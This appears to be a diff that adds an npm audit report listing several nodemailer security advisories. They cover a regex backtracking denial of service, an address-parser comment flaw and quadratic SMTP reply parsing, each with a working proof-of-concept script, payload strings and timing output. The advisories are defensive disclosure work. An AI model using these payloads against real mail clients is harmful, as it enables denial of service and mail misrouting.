2177\nPatterns:  /[ -]AUTH(?:(\\s+|=)[^\\n]*\\s+|\\s+|=)PLAIN/i\n           /[ -]AUTH(?:(\\s+|=)[^\\n]*\\s+|\\s+|=)LOGIN/i\n           /[ -]AUTH(?:(\\s+|=)[^\\n]*\\s+|\\s+|=)CRAM-MD5/i\n           /[ -]AUTH(?:(\\s+|=)[^\\n]*\\s+|\\s+|=)XOAUTH2/i\n```\n\n## Impact\n\nAlgorithmic-complexity denial of service against any Node.js process that opens an SMTP connection to an attacker-controlled or attacker-influenced host. Node.js is single threaded, so the process stalls entirely while the regex engine backtracks: no other requests are served, no timers fire, and the built-in socket timeout (10 minutes) cannot interrupt synchronous JavaScript. A 4,000-character whitespace run inside a single continuation line already blocks each regex for tens of seconds; the client bounds a response at 1 MB, which leaves headroom for blocking runs measured in hours across the four patterns. Two realistic attacker positions reach the sink pre-authentication: a hosted mailer that lets tenants configure their own SMTP server, and any network-adjacent attacker able to man-in-the-middle a cleartext SMTP connection (including before STARTTLS negotiation).\n\n## Proof of Concept\n\nThe PoC exercises the exact four regexes copied from `src/smtp-connection/index.ts` against a synthesized `250-AUTH<whitespace>NOMATCH` line, so no live SMTP server is needed to reproduce the timing.\n\n```text\nRuntime:      Node.js >= 20\nDependencies: none\nInvocation:   node poc.js\n```\n\n```javascript\n'use strict';\n\nconst AUTH_REGEXES = [\n    /[ -]AUTH(?:(\\s+|=)[^\\n]*\\s+|\\s+|=)PLAIN/i,\n    /[ -]AUTH(?:(\\s+|=)[^\\n]*\\s+|\\s+|=)LOGIN/i,\n    /[ -]AUTH(?:(\\s+|=)[^\\n]*\\s+|\\s+|=)CRAM-MD5/i,\n    /[ -]AUTH(?:(\\s+|=)[^\\n]*\\s+|\\s+|=)XOAUTH2/i,\n];\n\nfunction bench(n) {\n    const line = '250-AUTH' + ' '.repeat(n) + 'NOMATCH';\n    const start = Date.now();\n    for (const re of AUTH_REGEXES) re.test(line);\n    return Date.now() - start;\n}\n\nfor (const n of [500, 1000, 2000, 3000]) {\n    console.log(`n=${n}  four-regex time=${bench(n)} ms`);\n}\n\nconst control = '250-AUTH PLAIN LOGIN CRAM-MD5 XOAUTH2';\nconst t0 = Date.now();\nfor (const re of AUTH_REGEXES) re.test(control);\nconsole.log(`well-formed control  four-regex time=${Date.now() - t0} ms`);\n```\n\n```text\nn=500   four-regex time=914 ms\nn=1000  four-regex time=1348 ms\nn=2000  four-regex time=10558 ms\nn=3000  four-regex time=35251 ms\nwell-formed control  four-regex time=0 ms\n```\n\nDoubling the whitespace run multiplies the wall time by roughly four, which matches the expected O(n^2) growth. The well-formed control shows that a normal EHLO response is parsed in effectively zero time.\n\n## Attack Chain\n\n1. **Exposure:** The victim application, or any dependent that uses `nodemailer` to send mail, opens a TCP or TLS connection to an SMTP host the attacker controls. This happens automatically for multi-tenant mailers whose tenants configure their own outbound SMTP server, and for any client whose plaintext SMTP session can be intercepted by a network-adjacent attacker before STARTTLS negotiation.\n2. **Control:** The attacker fully controls the bytes returned in response to `EHLO`. In particular, the attacker chooses the length and content of every `250-` continuation line up to the client's 1 MB response cap.\n3. **Path:** Socket bytes are reassembled by `_onData`, decoded by `_processResponse`, and dispatched to `_actionEHLO`. On the first EHLO after the greeting (malicious server with no STARTTLS), on the second EHLO after a successful STARTTLS upgrade, or on the first EHLO when `ignoreTLS` is set, control reaches the AUTH detection block near the end of `_actionEHLO`.\n4. **Guard:** The only bounds on this path are `maxResponseSize` (1 MB by default) and the 421 or non-2xx status-code check. Neither prevents O(n^2) backtracking: 4,000 whitespace characters already block each regex for tens of seconds, well below the 1 MB cap. No length, shape, or sanitization check runs before the regexes.\n5. **Primitive:** Four `RegExp.prototype.test` calls execute against the crafted line, each entering catastrophic backtracking because `[^\\n]*` and `\\s+` share the whitespace alphabet and the mechanism literal never matches.\n6. **Result:** The Node.js event loop is blocked for the duration of the four regex evaluations. All other work in the process, including timers, unrelated requests, keep-alive traffic, and the SMTP socket timeout itself, is suspended until the regexes return.\n\n## Bypass Evidence\n\nThe only response-side protection in this code path is `maxResponseSize`, introduced by the fix for GHSA-4g23-2xm8-66gc (commit `f2d82fa`). That fix targeted quadratic reassembly of long multiline replies inside `_onData` and left the AUTH regex evaluation in `_actionEHLO` untouched. `maxResponseSize` does not prevent this issue: at 4,000 whitespace characters, roughly 0.4 percent of the default 1 MB cap, a single continuation line already blocks each of the four regexes for tens of seconds. No status-code or length gate rejects the payload before the regex engine enters the ambiguous alternation, and Node.js's single-threaded event loop cannot service the socket timeout while a synchronous `test()` call is running. Two other recent linear-time fixes in this project (the addressparser fallback for GHSA-v53p-9fqp-m79j and the DKIM header unfolding for GHSA-39m8-27wv-hr27) address entirely different modules and inputs and do not touch the AUTH mechanism regexes.\n\n## Affected Versions\n\n- **Ecosystem:** `npm`\n- **Package:** `nodemailer`\n- **Confirmed affected range:** `>= 3.0.0, <= 10.0.12`\n- **Latest release checked:** `10.0.12` ([npm registry](https://registry.npmjs.org/nodemailer/10.0.12))\n- **Fix status:** 10.0.13\n\nThe four AUTH mechanism regexes were introduced when the SMTP client was bundled into `nodemailer` at 3.0.0 (previously a separate `smtp-connection` package). The vulnerable alternation `(?:(\\s+|=)[^\\n]*\\s+|\\s+|=)` is present, unchanged, in every published release from 3.0.0 (`lib/smtp-connection/index.js`) through 10.0.12 (`dist/esm/smtp-connection/index.js` and `dist/cjs/smtp-connection/index.js`). A later refactor added a leading `[ -]` character class but did not alter the ambiguous inner alternation. No release, and no development branch inspected at the current HEAD (`30e4cfd`), contains a fix for this pattern.\n\n## Suggested Fix\n\nReplace the four backtracking regexes with a non-ambiguous parse of the AUTH extension. The invariant the fix must enforce is that mechanism detection runs in time linear in the response length regardless of whitespace shape. A minimal approach: match the AUTH extension value with a single non-backtracking pattern (for example, `/[ -]AUTH(?:\\s+|=)([^\\r\\n]*)/i`) and then check for each mechanism name against the whitespace-split tokens with a `Set` lookup or `includes`. The fix must cover both continuation forms (`250-AUTH ...` and `250 AUTH ...`) and both delimiters (space and `=`), and must handle the \"AUTH advertised with no mechanisms\" case without walking the whitespace run. As an interim mitigation, callers who never connect to an untrusted SMTP peer can restrict SMTP endpoints to a known allowlist; this does not help clients that must interoperate with arbitrary user-configured servers or with any cleartext SMTP path exposed to a network-adjacent attacker before STARTTLS.\n\n---\n\nReported by zx (GitHub: @manus-pi).",
+      "reported_by": null,
+      "title": "Nodemailer: Quadratic backtracking in SMTP AUTH mechanism detection regexes allows pre-auth remote denial of service",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "nodemailer",
+      "vulnerable_versions": ">=3.0.0 <=10.0.12",
+      "github_advisory_id": "GHSA-4ffr-jq9g-5ffx",
+      "recommendation": "Upgrade to version 10.0.13 or later",
+      "patched_versions": ">=10.0.13",
+      "updated": "2026-10-27T15:04:41.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-4ffr-jq9g-5ffx"
+    },
+    "1243443": {
+      "findings": [
+        {
+          "version": "10.0.6",
+          "paths": [
+            "apps__api>nodemailer"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-g73g-hqqh-jr95\n- https://github.com/nodemailer/nodemailer/commit/a502247555fd81773eac337486781f3b6008e16a\n- https://github.com/nodemailer/nodemailer/releases/tag/v10.0.13\n- https://github.com/advisories/GHSA-g73g-hqqh-jr95",
+      "created": "2026-10-27T15:04:36.000Z",
+      "id": 1243443,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nNodemailer's address parser has three published, patched fixes for RFC 5322 comment `( ... )` handling inside an addr-spec: GHSA-cc9r-2j5m-2m83 (comment glued two domain atoms into one), GHSA-g57g-f23g-4646 (the same glue for a quoted local part), and the related ReDoS fixes GHSA-prgh-xp8r-p3m5 / GHSA-v53p-9fqp-m79j. All three fixes live in `_handleAddress()`'s `joins` / `_recoverAddrSpec()` logic in `src/addressparser/index.ts`, and that logic is exercised whenever the local text-accumulation path in the tokenizer runs.\n\nThat logic is **never reached at all** for the single most common way a recipient is written: a display name followed by an angle-bracket address, `Name <local@domain>`. When the input inside the angle brackets itself contains an RFC 5322 comment, e.g.\n\n```\nLegit User <user@good-corp.com(x)evil.com>\n```\n\nthe comment is not recognized as an operator, is not stripped, and the parenthesis characters survive **verbatim** inside the parsed address. That value is used as-is for `envelope.to` and is written raw onto the wire in the `RCPT TO` SMTP command. I confirmed this end to end:\n\n* against nodemailer's own `jsonTransport`/`streamTransport` (`envelope.to` and the emitted `To:` header both carry the malformed value), and\n* against a real SMTP server (`aiosmtpd`), where the malformed value is fatal to the transaction (`501 Syntax: RCPT TO: <address> [SP <mail-parameters>]`, all recipients rejected).\n\nThis reproduces unmodified on every version I tested from `6.9.16` through the current `10.0.12` HEAD, i.e. it predates and survives all three of the address-parser advisories above unchanged, because it is a different root cause in a code path those fixes never touch.\n\n## Root cause\n\n### 1. The tokenizer has a single-slot operator stack\n\n`src/addressparser/index.ts`, `Tokenizer.checkChar()`:\n\n```ts\n} else if (!this.operatorExpecting && !this.inDomainLiteral && chr in this.operators) {\n    this.node = { type: 'operator', value: chr };\n    this.list.push(this.node);\n    this.node = null;\n    this.operatorExpecting = this.operators[chr];\n    this.escaped = false;\n    return;\n}\n```\n(currently around line 670)\n\n`operatorExpecting` is a single string, not a stack. Once `<` opens the address scope, `operatorExpecting` is set to `'>'`. The branch above that recognizes a *new* operator character (such as `(`) is gated on `!this.operatorExpecting`, which is now false. So while inside `<...>`, a `(` is never tokenized as an operator at all — it is just an ordinary character appended to the running text token, together with everything up to the next `>`. The RFC 5322 comment is not recognized, not entered, and not stripped: it rides straight through as literal text.\n\n### 2. The `_handleAddress` state machine loses the `address` state on any operator boundary\n\n`src/addressparser/index.ts`, inside `_handleAddress()` (currently around line 365-388):\n\n```ts\nswitch (token.value) {\n    case '<':\n        state = 'address';\n        insideQuotes = false;\n        break;\n    case '(':\n        state = 'comment';\n        insideQuotes = false;\n        break;\n    ...\n    default:\n        state = 'text';\n        insideQuotes = false;\n        break;\n}\n```\n\nEven where a comment *is* recognized (outside angle brackets), closing it with `)` falls through to `default` and resets `state` to `'text'`, not back to whatever state was active before the comment opened. This is why the fixed cases (bare address, quoted local part) only work at all: the leaked comment tail lands in the free-`text` bucket, where `_recoverAddrSpec()`/the ADDR_SPEC extraction logic can find and strip it. Inside `<...>`, none of that applies in the first place (point 1), so there is no text-bucket safety net to fall back on — the whole point 1/point 2 interaction is what makes the angle-bracket case categorically different from, and unprotected by, the three existing fixes.\n\n### 3. The one existing safety net requires whitespace, and this value has none\n\n`_recoverAddrSpec()` (currently around line 283) is the function all three prior fixes rely on to peel a clean addr-spec back out of a polluted value. Its very first line is:\n\n```ts\nfunction _recoverAddrSpec(data: { address: string; text: string }): void {\n    if (!HAS_WHITESPACE.test(data.address)) {\n        return;\n    }\n    ...\n```\n\n`user@good-corp.com(x)evil.com` contains no whitespace at all — the comment content `x` had none, and nothing in the angle-bracket path inserts any — so `_recoverAddrSpec` bails out immediately and never even looks at the value. There is no cleanup path for this shape.\n\n## Proof of Concept\n\nEnvironment: Node.js, current `master` (commit `30e4cfd5902fd5da4d1bc76dc8e4bc92d288adef`, package.json version `10.0.12`), no special transport configuration required.\n\n### Parser-level confirmation\n\n```js\nconst addressparser = require('nodemailer/lib/addressparser');\nconsole.log(addressparser('Legit User <user@good-corp.com(x)evil.com>'));\n// [ { address: 'user@good-corp.com(x)evil.com', name: 'Legit User' } ]\n```\n\nCompare with the already-fixed, unbracketed form of the exact same bytes:\n\n```js\nconsole.log(addressparser('user@good-corp.com(x)evil.com'));\n// [ { address: 'user@good-corp.com', name: 'evil.com' } ]   <- correctly stripped\n```\n\n### `sendMail` / envelope confirmation (jsonTransport, no network)\n\n```js\nconst nodemailer = require('nodemailer');\n\n(async () => {\n    const t = nodemailer.createTransport({ jsonTransport: true });\n    const info = await t.sendMail({\n        from: 'app@good-corp.com',\n        to: 'Legit User <user@good-corp.com(x)evil.com>',\n        subject: 'hi',\n        text: 'x'\n    });\n    console.log('envelope.to:', info.envelope.to);\n})();\n```\n\nObserved output:\n\n```\nenvelope.to: [ 'user@good-corp.com(x)evil.com' ]\n```\n\nThe raw `streamTransport` message shows the same value in the emitted header:\n\n```\nFrom: app@good-corp.com\nTo: Legit User <user@good-corp.com(x)evil.com>\nSubject: hi\n```\n\n### Wire-level confirmation against a real SMTP server\n\n```js\nconst net = require('net');\nconst nodemailer = require('nodemailer');\n\nconst server = net.createServer(sock => {\n    let buf = '';\n    sock.write('220 sink ESMTP\\r\\n');\n    sock.on('data', d => {\n        buf += d;\n        let i;\n        while ((i = buf.indexOf('\\r\\n')) >= 0) {\n            const line = buf.slice(0, i);\n            buf = buf.slice(i + 2);\n            const u = line.toUpperCase();\n            if (u.startsWith('EHLO')) sock.write('250-sink\\r\\n250 8BITMIME\\r\\n');\n            else if (u.startsWith('MAIL')) sock.write('250 ok\\r\\n');\n            else if (u.startsWith('RCPT')) { console.log('wire RCPT TO :', line); sock.write('250 ok\\r\\n'); }\n            else if (u.startsWith('DATA')) sock.write('354 go\\r\\n');\n            else if (line === '.') sock.write('250 ok\\r\\n');\n            else if (u.startsWith('QUIT')) { sock.write('221 bye\\r\\n'); sock.end(); }\n            else sock.write('250 ok\\r\\n');\n        }\n    });\n});\n\nserver.listen(0, '127.0.0.1', async () => {\n    const t = nodemailer.createTransport({ host: '127.0.0.1', port: server.address().port, secure: false });\n    const info = await t.sendMail({ from: 'app@good-corp.com', to: 'Legit User <user@good-corp.com(x)evil.com>', subject: 'hi', text: 'x' });\n    console.log('envelope.to:', info.envelope.to);\n    t.close(); server.close();\n});\n```\n\nObserved:\n\n```\nwire RCPT TO : RCPT TO:<user@good-corp.com(x)evil.com>\nenvelope.to: [ 'user@good-corp.com(x)evil.com' ]\n```\n\nThe same recipient string sent at a real, conformant SMTP server (`aiosmtpd`, a widely used reference-grade Python SMTP implementation) instead of the sink above:\n\n```\nError: Can't send mail - all recipients were rejected: 501 Syntax: RCPT TO: <address> [SP <mail-parameters>]\ncode: 'EENVELOPE', responseCode: 501, command: 'RCPT TO',\nrejected: [ 'user@good-corp.com(x)evil.com' ]\n```\n\nSo against a strict receiver the immediate, concretely demonstrated outcome is that the message is bounced: an ordinary-looking recipient address that a sender/application believes is valid (and, see below, that some app-side validators *do* read as valid, at `good-corp.com`) silently fails to send.\n\n### Interpretation-conflict confirmation (same class as GHSA-cc9r-2j5m-2m83)\n\nThe same string, read by two other parsers an application might use to gate on the recipient's domain, produces two more, mutually different readings:\n\n```python\n>>> import email.utils\n>>> email.utils.parseaddr('Legit User <user@good-corp.com(x)evil.com>')\n('Legit User (x)', 'user@good-corp.comevil.com')\n```\n\n```python\n>>> import email.policy, email.parser\n>>> msg = email.parser.Parser(policy=email.policy.default).parsestr(\n...     'To: Legit User <user@good-corp.com(x)evil.com>\\n\\n')\n>>> addr = msg['To'].addresses[0]\n>>> addr.username, addr.domain\n('user', 'good-corp.com')\n```\n\nSo for the exact same bytes:\n\n| Parser | Domain read | \n|---|---|\n| Python `email.utils.parseaddr` | `good-corp.comevil.com` (attacker-registrable) |\n| Python `email.policy.default` (defects not inspected) | `good-corp.com` (clean, would pass an allow-list check) |\n| Nodemailer `addressparser` (this report) | `good-corp.com(x)evil.com` (illegal characters, rejected by a strict MTA) |\n\nThis is the exact \"which parser sees what\" comparison table from GHSA-cc9r-2j5m-2m83, reproduced through a different, unpatched code path: an application validating with `email.policy.default` without checking `.defects` (a documented pattern in that advisory) approves `good-corp.com` and hands the string to Nodemailer, which then emits a different, malformed value on the wire.\n\n### Version range\n\nThe built `addressparser`/`sendMail` output was tested for this exact input across published releases:\n\n| Version | `envelope.to` |\n|---|---|\n| `6.9.16` | `user@good-corp.com(x)evil.com` |\n| `9.0.6` | `user@good-corp.com(x)evil.com` |\n| `9.1.0` (fixed GHSA-cc9r-2j5m-2m83) | `user@good-corp.com(x)evil.com` |\n| `10.0.1` | `user@good-corp.com(x)evil.com` |\n| `10.0.12` / current HEAD (fixed GHSA-g57g-f23g-4646) | `user@good-corp.com(x)evil.com` |\n\nUnchanged across every one of the three address-parser advisory fixes, because none of them touch the tokenizer's single-slot `operatorExpecting` state or the `_handleAddress` state-machine reset on `)`.\n\n## Impact\n\n* **Confirmed, demonstrated impact:** a recipient address that contains a perfectly legal RFC 5322 comment inside angle brackets — the single most common way a `To`/`Cc`/`Bcc`/`From`/`Reply-To` value is written (`Display Name <user@domain>`) — is parsed into a value containing SMTP-illegal characters (`(`, `)`) that a conformant receiving SMTP server rejects outright, silently failing message delivery to what the sender/application believed was a valid, already-validated recipient (CWE-20, availability/reliability impact on outbound mail).\n* **Demonstrated interpretation conflict (CWE-436):** the malformed value that reaches `envelope.to` and the wire `RCPT TO` command disagrees with how other parsers, including ones explicitly called out as an at-risk validation pattern in GHSA-cc9r-2j5m-2m83 (Python's `email.policy.default` without defect inspection), read the exact same bytes. An application gating outbound mail on \"is the recipient's domain in my allow-list\" using such a validator can approve a value that Nodemailer then sends corrupted, and depending on the receiving MTA's own comment handling, a different domain than either the sender or the validator believed was being used.\n* **Reachability:** every code path that ends up calling `MimeNode._parseAddresses()` — `to`, `cc`, `bcc`, `from`, `replyTo`, and the explicit `envelope` option — is affected identically, since they all funnel through the same `addressparser()`/`_handleAddress()` logic.\n\n## Suggested fix\n\nThe underlying issue is architectural: `Tokenizer.operatorExpecting` is a single value, so it cannot represent \"currently inside an angle-address, and also currently inside a comment nested within it.\" A minimal fix is to make the tokenizer maintain a stack of expected closing characters (pushing `')'` when entering a comment while another operator scope, e.g. `'>'`, is already open, and popping back to the outer expectation on `)`), so a comment can be recognized and stripped no matter what scope it is nested inside. `_handleAddress`'s state machine would then need to restore the previous `state` on a comment close instead of unconditionally resetting to `'text'`, so recognized-but-stripped comment content inside `<...>` continues to accumulate as `address` rather than leaking into `text`.\n\nAs defense in depth, `_recoverAddrSpec()` (or an equivalent check run specifically on `data.address` for the angle-bracket case) should also reject/clean any parsed address value that still contains RFC 5322 special characters such as `(`/`)` regardless of whether whitespace is present, since `envelope.to` is used directly to build an SMTP command and any character outside `Mailbox` (RFC 5321 §4.1.2) reaching that string is already the wrong outcome, independent of how it got there.\n\n## Regression test suggestion\n\n`Name <user@example.com(x)evil.com>` and the bcc/cc/from/replyTo/envelope equivalents should all parse to `{ address: 'user@example.com', name: 'Name evil.com' }` or be rejected outright by `sendMail`, never silently carry `(`/`)` into `envelope.to`.",
+      "reported_by": null,
+      "title": "Nodemailer: RFC 5322 comment inside an angle-bracket address is never stripped",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "nodemailer",
+      "vulnerable_versions": ">=3.0.0 <=10.0.12",
+      "github_advisory_id": "GHSA-g73g-hqqh-jr95",
+      "recommendation": "Upgrade to version 10.0.13 or later",
+      "patched_versions": ">=10.0.13",
+      "updated": "2026-10-27T15:04:36.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-20",
+        "CWE-436"
+      ],
+      "url": "https://github.com/advisories/GHSA-g73g-hqqh-jr95"
+    },
+    "1243444": {
+      "findings": [
+        {
+          "version": "10.0.6",
+          "paths": [
+            "apps__api>nodemailer"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-4g23-2xm8-66gc\n- https://github.com/nodemailer/nodemailer/commit/f2d82fa84d47015a7bbb4253da61eeb778c658b1\n- https://github.com/nodemailer/nodemailer/releases/tag/v10.0.10\n- https://github.com/advisories/GHSA-4g23-2xm8-66gc",
+      "created": "2026-10-27T15:04:33.000Z",
+      "id": 1243444,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nThe SMTP client response parser reassembles multiline server replies by appending each continuation line onto a single response-queue entry and re-testing whether that entry is still a partial (continuation) reply on every line. The partial-response test runs `str.slice(str.lastIndexOf('\\n') + 1)` on the growing entry, which forces a full flatten of the entire accumulated string on each line. A malicious or compromised SMTP server (or an on-path attacker on a plaintext or pre-STARTTLS hop) that streams continuation lines and never sends a completion line drives O(n^2) CPU on the single-threaded Node.js event loop before any authentication, freezing the whole process for an attacker-controlled duration.\n\n## Root Cause\n\nThe invariant that a server cannot cause superlinear client-side work while a reply is being reassembled is violated. In `src/smtp-connection/index.ts`, `_onData` splits inbound bytes into lines and, while the last queued entry is a continuation reply, concatenates each new line onto that same entry with `this._responseQueue[len - 1] += '\\n' + lines[i]`. On every iteration it calls `isPartialResponse(lastline)`, which evaluates `/^\\d+-/.test(str.slice(str.lastIndexOf('\\n') + 1))`. Because the queued entry grows by one line per continuation line and is stored as a V8 rope (ConsString), each `lastIndexOf`/`slice` forces a full string flatten of length proportional to the accumulated reply. Executed once per line over n continuation lines, this is O(n^2) CPU. While the reply stays partial the function early-returns and never resets the entry, so the growth and the per-line reflatten continue unbounded. There is no response-size or line-count cap in the connection code; the only limits are time-based (`greetingTimeout`, and an inactivity `socketTimeout`), and neither bounds accumulated reply size.\n\n```text\nAffected file and functions (verified at the published v10.0.9 artifact, in src/ and in the built dist/cjs and dist/esm output):\n- src/smtp-connection/index.ts: isPartialResponse (the /^\\d+-/ test over str.slice(str.lastIndexOf('\\n')+1))\n- src/smtp-connection/index.ts: SMTPConnection._onData (the continuation-line append loop with no size cap)\n```\n\n## Impact\n\nAn attacker who is, or can impersonate, the SMTP peer the client connects to can freeze the connecting Node.js process. Because Node.js is single-threaded, event-loop starvation halts all other work in that process (every other connection, request, and timer), not just the offending SMTP session. The reply is parsed during the greeting and EHLO phases, before the client authenticates or issues any command, so no credentials on the client are required. The blocking duration scales with the volume of continuation data the attacker streams and can be sustained indefinitely by continuing to stream, and memory for the accumulated entry also grows without bound. Independent reproduction on Node.js 24 measured roughly 11.6 seconds of event-loop blocking for about 640 KB of continuation data and roughly 47 seconds for about 1.3 MB, scaling quadratically. This is a repeatable remote denial of service against the sending process.\n\n## Proof of Concept\n\n`Node.js 24; a raw TCP listener acting as a hostile SMTP server; the client uses the shipped SMTPConnection (require('nodemailer/lib/smtp-connection')).`\n\nSteps: (1) start a TCP server that accepts a connection and streams continuation lines of the form `220-flood...\\r\\n` in large batches, never emitting a completion line such as `220 ready`; (2) point an SMTPConnection at it and observe the client event loop stall while the single response-queue entry grows and is reflattened on every line. A minimal microbenchmark of the exact parsing logic demonstrates the complexity:\n\n```js\n// Reproduces isPartialResponse + the _onData append loop verbatim (Node 24).\nfunction isPartialResponse(str) { return /^\\d+-/.test(str.slice(str.lastIndexOf('\\n') + 1)); }\nfunction run(n) {\n    const queue = [];\n    let remainder = '';\n    function onData(chunk) {\n        const lines = (remainder + chunk).split(/\\r?\\n/);\n        remainder = lines.pop();\n        for (let i = 0; i < lines.length; i++) {\n            if (queue.length && isPartialResponse(queue[queue.length - 1])) {\n                queue[queue.length - 1] += '\\n' + lines[i];\n                continue;\n            }\n            queue.push(lines[i]);\n        }\n    }\n    let buf = '';\n    for (let i = 0; i < n; i++) buf += '220-flood line ' + i + '\\r\\n';\n    const t = Date.now();\n    onData(buf);\n    return Date.now() - t;\n}\nfor (const n of [8000, 16000, 32000, 64000]) console.log(n, run(n) + 'ms');\n```\n\n```text\n8000   26.5ms\n16000  357.6ms\n32000  2712.0ms\n64000  11645.1ms\n(2x input yields roughly 4x-7x time: quadratic. ~640 KB of continuation data blocks the event loop ~11.6s.)\n```\n\n## Attack Chain\n\n1. **Exposure:** The client opens an SMTP connection whose peer is attacker-controlled or attacker-influenced: a compromised or malicious configured server, a tenant-supplied outbound server in a multi-tenant \"bring your own SMTP\" deployment, a deliverability or mailbox-probing tool that connects to arbitrary servers, or an on-path attacker on a plaintext or pre-STARTTLS hop.\n2. **Control:** The peer fully controls the bytes of its greeting and EHLO replies, including whether a reply ever completes.\n3. **Path:** Inbound bytes reach the socket `data` handler `_onData`, the sole data handler; every reply phase traverses the same continuation-append loop.\n4. **Guard:** No response-size or line-count cap exists. The greeting timer is time-based and cleared after the greeting, and its callback is itself starved while `_onData` runs synchronously; the inactivity timer resets on every inbound chunk, so an actively streaming attacker never trips it.\n5. **Primitive:** Each continuation line appended to the single growing queue entry triggers a full string flatten in `isPartialResponse`, yielding O(n^2) synchronous CPU on the event loop.\n6. **Result:** Whole-process event-loop starvation for an attacker-controlled, sustainable duration, plus unbounded memory growth: a remote denial of service reachable before authentication.\n\n## Bypass Evidence\n\nThe relevant guard would be a cap on accumulated reply size or line count. A search of the connection module (`maxSize`, `maxLength`, `responseQueue.length >`, byte or line ceilings) finds none; the only bounds are `greetingTimeout` and the inactivity-based `socketTimeout`, both time-based and neither bounding accumulated size. Disproof attempts: the greeting timeout does not help because it is time-based, fires only during the greeting phase, is cleared once the greeting completes, and its callback is delayed while `_onData` runs synchronously; a well-behaved server does not trigger the issue because a completion line resets the entry and keeps cost linear, but the modeled attacker is a hostile peer; segmented delivery does not help the defender because the response queue and line remainder persist across `_onData` calls so the accumulation and quadratic cost survive chunking; there is no safer alternate caller because `_onData` is the only data handler and the append loop is on every reply phase. Note on scope: core nodemailer connects to a configured host and does not perform MX resolution, so this is not reachable through a direct-to-MX transport; the malicious-peer, multi-tenant tenant-supplied-host, deliverability-probe, and MITM paths establish reachability.\n\n## Affected Versions\n\n- `Ecosystem: npm`\n- `Package: nodemailer`\n- `Confirmed affected range: <= 10.0.9`\n- `Latest release checked: nodemailer 10.0.9 (npm registry; vulnerable code verified at git tag v10.0.9 and in the published dist output)`\n- `Fix status: 10.0.10`\n\nThe quadratic reassembly shape is long-standing and predates the addressparser complexity fix family, so the exact introducing release is not positively established and the lower bound is left open; the upper bound is verified against the current published artifact, which is vulnerable with no fix.\n\n## Suggested Fix\n\nEnforce that reassembling a multiline reply is linear in the reply size and that the reply size is bounded. Track the running length of the accumulated entry and the continuation state without re-scanning the whole entry on every line (for example, test the newly arrived line rather than slicing the tail of the growing accumulator, or collect lines in an array and join once at completion). Independently, impose a configurable maximum on the accumulated reply size or continuation-line count and fail the connection when it is exceeded, so a peer that never completes a reply cannot force unbounded work or memory. The remediation must cover every reply phase (greeting, EHLO, and command responses), because all of them flow through the same handler. As an interim mitigation, only connect to trusted SMTP servers over authenticated TLS (avoiding plaintext or STARTTLS-strippable hops), and in multi-tenant deployments isolate outbound SMTP sessions to tenant-supplied hosts so one tenant cannot starve a shared process.\n\nReported by zx (GitHub: @manus-pi).",
+      "reported_by": null,
+      "title": "Nodemailer: Quadratic (O(n^2)) SMTP client reply parsing lets a malicious server or MITM cause a pre-auth remote denial of service",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "nodemailer",
+      "vulnerable_versions": ">=3.0.0 <=10.0.9",
+      "github_advisory_id": "GHSA-4g23-2xm8-66gc",
+      "recommendation": "Upgrade to version 10.0.10 or later",
+      "patched_versions": ">=10.0.10",
+      "updated": "2026-10-27T15:04:35.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-407"
+      ],
+      "url": "https://github.com/advisories/GHSA-4g23-2xm8-66gc"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 0,
+      "moderate": 11,
+      "high": 4,
+      "critical": 0
+    },
+    "dependencies": 233,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 233
+  }
+}
